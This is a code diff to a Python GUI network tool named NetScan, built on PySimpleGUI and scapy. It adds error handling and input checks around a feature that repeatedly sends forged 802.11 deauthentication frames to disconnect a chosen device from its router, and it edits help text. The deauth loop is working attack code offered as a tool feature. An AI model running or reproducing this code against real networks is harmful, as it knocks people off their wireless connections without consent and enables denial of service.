@@ -17,17 +17,20 @@ deauth_thread = None
 
 # Network stuff
 def deauth_function(target_mac, bssid, count=1):
-    global stop_deauth_event
+    try:
+        global stop_deauth_event
 
-    stop_deauth_event.clear()  # Clears the event flag
+        stop_deauth_event.clear()  # Clears the event flag
 
-    while not stop_deauth_event.is_set():
-        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
-        for _ in range(count):
-            scapy.send(deauth_packet, verbose=False)
-        
-        time.sleep(10)
-        print("Deauthed for 10 Seconds, repeating...")
+        while not stop_deauth_event.is_set():
+            deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
+            for _ in range(count):
+                scapy.send(deauth_packet, verbose=False)
+            
+            time.sleep(10)
+            print("Deauthed for 10 Seconds, repeating...")
+    except:
+        print("Invalid input.")
 
 def start_deauth(target_mac, bssid, count=1):
     global deauth_thread
@@ -111,19 +114,19 @@ def scan_thread(ip):
     scanning_thread.start()
 
 # GUI
-sg.theme('Topanga') 
+sg.theme('Topanga')
 
 def help():
     layout2 = [
         [sg.Text('FAQ:')],
-        [sg.Text('    1. No results? I could be wrong but I believe this is occurs when WinPcap is used. This is not an issue with NetScan, but rather WinPcap.')],
+        [sg.Text('    1. No results? I could be wrong but I believe this is occurs when WinPcap is used.')],
         [sg.Text('       This can also occur because the IP Range you entered was Invalid. 24 is set by default which should work just fine.')],
         [sg.Text('')],
         [sg.Text("    2. OUI Manufacturer information is only 8 characters long. This issue has been resolved as of 0.0.4, however I thought this would also")],
         [sg.Text("       make a good feature. So there is now a checkbox located at the top to show Short OUIs, or long OUIs. If you want the full version,")],
         [sg.Text("       make sure you've unchecked the box.")],
         [sg.Text('')],
-        [sg.Text('Please report any bugs or issues you may find to williamchiozza@protonmail.com, and view the Documentation for more information.')]
+        [sg.Text('Please report any issues you may find to williamchiozza@protonmail.com, and view the Documentation for more information.')]
     ]
 
     help_window = sg.Window('NetScan Help', layout2, resizable=True)
@@ -150,9 +153,17 @@ def deauth_window():
         if event in (None, "Exit"):
             break
         elif event in '-DEAUTH-':
-            start_deauth(target_mac=values["-TARGET-"], bssid=values["-ROUTER-"])
-            print("Deauthing " + values["-TARGET-"] + ", this lasts about 10 seconds so it will be looped every 10 seconds.\n--------------------------------------------------------------------")
+            target_mac = values["-TARGET-"]
+            router_mac = values["-ROUTER-"]
+
+            if target_mac and router_mac:
+                start_deauth(target_mac=target_mac, bssid=router_mac)
+                print(f"Deauthing {target_mac}, this lasts about 10 seconds and will be looped every 10 seconds.\n--------------------------------------------------------------------")
+            else:
+                deauth_win.FindElement("-OUT-").Update('')
+                print("Values not set. Please enter details in both Target MAC and Router MAC. If you need any help feel free to read the Documentation.")
         elif event in "-STOP-":
+            deauth_win.FindElement("-OUT-").Update('')
             stop_deauth_thread()
 
     deauth_win.Close()
